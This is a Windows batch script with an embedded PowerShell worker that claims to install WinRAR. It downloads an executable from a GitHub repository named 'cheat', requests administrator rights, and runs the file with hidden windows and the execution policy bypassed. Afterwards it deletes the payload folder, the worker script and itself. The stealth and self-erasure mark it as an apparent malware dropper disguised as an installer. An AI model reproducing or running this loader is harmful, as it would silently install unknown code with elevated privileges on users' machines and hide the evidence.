@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "BASE_TEMP=%LOCALAPPDATA%\Temp"
set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
set "LOG=%BASE_TEMP%\winrar_worker.log"
set "RUNNER_BAT=%~f0"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$ps = @'" ^
  "$ErrorActionPreference = 'Stop'" ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" ^
  "" ^
  "$u = $env:URL" ^
  "$h = $env:HASH.ToLowerInvariant()" ^
  "$dir = $env:WORK_DIR" ^
  "$f = $env:OUT" ^
  "$log = $env:LOG" ^
  "$psFile = $env:PS_SCRIPT" ^
  "$runner = $env:RUNNER_BAT" ^
  "" ^
  "function Write-Log([string]$Msg) {" ^
  "    $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg" ^
  "    $null = Add-Content -LiteralPath $log -Value $line -Encoding UTF8 -PassThru" ^
  "}" ^
  "" ^
  "function Get-FileFromUrl([string]$TargetUrl, [string]$OutFile) {" ^
  "    if (Test-Path -LiteralPath $OutFile) {" ^
  "        Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "    try {" ^
  "        Invoke-WebRequest -Uri $TargetUrl -OutFile $OutFile -UseBasicParsing" ^
  "        if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {" ^
  "            return $true" ^
  "        }" ^
  "    } catch {" ^
  "        Write-Log ('Invoke-WebRequest error: ' + $_.Exception.Message)" ^
  "    }" ^
  "    try {" ^
  "        $wc = New-Object System.Net.WebClient" ^
  "        $wc.DownloadFile($TargetUrl, $OutFile)" ^
  "        $wc.Dispose()" ^
  "        if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {" ^
  "            return $true" ^
  "        }" ^
  "    } catch {" ^
  "        Write-Log ('WebClient error: ' + $_.Exception.Message)" ^
  "    }" ^
  "    return $false" ^
  "}" ^
  "" ^
  "$id = [Security.Principal.WindowsIdentity]::GetCurrent()" ^
  "$pr = New-Object Security.Principal.WindowsPrincipal($id)" ^
  "$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" ^
  "" ^
  "if (-not $isAdmin) {" ^
  "    Write-Log 'Elevating worker process via RunAs'" ^
  "    $psi = New-Object System.Diagnostics.ProcessStartInfo" ^
  "    $psi.FileName = 'powershell.exe'" ^
  "    $psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $psFile + '\"'" ^
  "    $psi.Verb = 'RunAs'" ^
  "    $psi.UseShellExecute = $true" ^
  "    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden" ^
  "    $null = [System.Diagnostics.Process]::Start($psi)" ^
  "    exit 0" ^
  "}" ^
  "" ^
  "try {" ^
  "    Write-Log ('Admin worker started. URL=' + $u)" ^
  "    if (-not (Test-Path -LiteralPath $dir)) {" ^
  "        $null = New-Item -ItemType Directory -Path $dir -Force" ^
  "    }" ^
  "" ^
  "    $retries = 2" ^
  "    $verified = $false" ^
  "" ^
  "    for ($i = 0; $i -le $retries; $i++) {" ^
  "        Write-Log ('Attempt ' + ($i + 1) + ' of ' + ($retries + 1))" ^
  "        $ok = Get-FileFromUrl -TargetUrl $u -OutFile $f" ^
  "        if (-not $ok) {" ^
  "            Write-Log 'Download failed'" ^
  "            continue" ^
  "        }" ^
  "        $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant()" ^
  "        if ($actual -eq $h) {" ^
  "            Write-Log 'SHA-256 match'" ^
  "            $verified = $true" ^
  "            break" ^
  "        } else {" ^
  "            Write-Log ('SHA-256 mismatch. Expected=' + $h + ' Got=' + $actual)" ^
  "            Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue" ^
  "        }" ^
  "    }" ^
  "" ^
  "    if (-not $verified) {" ^
  "        Write-Log 'Hash verification failed after retries'" ^
  "        exit 2" ^
  "    }" ^
  "" ^
  "    Write-Log 'Launching target executable as administrator'" ^
  "    $proc = Start-Process -FilePath $f -Verb RunAs -PassThru -Wait" ^
  "    Write-Log ('Target exit code: ' + $proc.ExitCode)" ^
  "    exit [int]$proc.ExitCode" ^
  "} catch {" ^
  "    Write-Log ('Fatal error: ' + $_.Exception.Message)" ^
  "    exit 99" ^
  "} finally {" ^
  "    Start-Sleep -Seconds 2" ^
  "    if ($dir -and (Test-Path -LiteralPath $dir)) {" ^
  "        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "    if ($runner -and (Test-Path -LiteralPath $runner)) {" ^
  "        Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "    if ($psFile -and (Test-Path -LiteralPath $psFile)) {" ^
  "        Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue" ^
  "    }" ^
  "}" ^
  "'@" ^
  "[System.IO.File]::WriteAllText($env:PS_SCRIPT, $ps, (New-Object System.Text.UTF8Encoding($false)))" >nul 2>&1

if not exist "%PS_SCRIPT%" exit /b 1

start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
exit /b 0
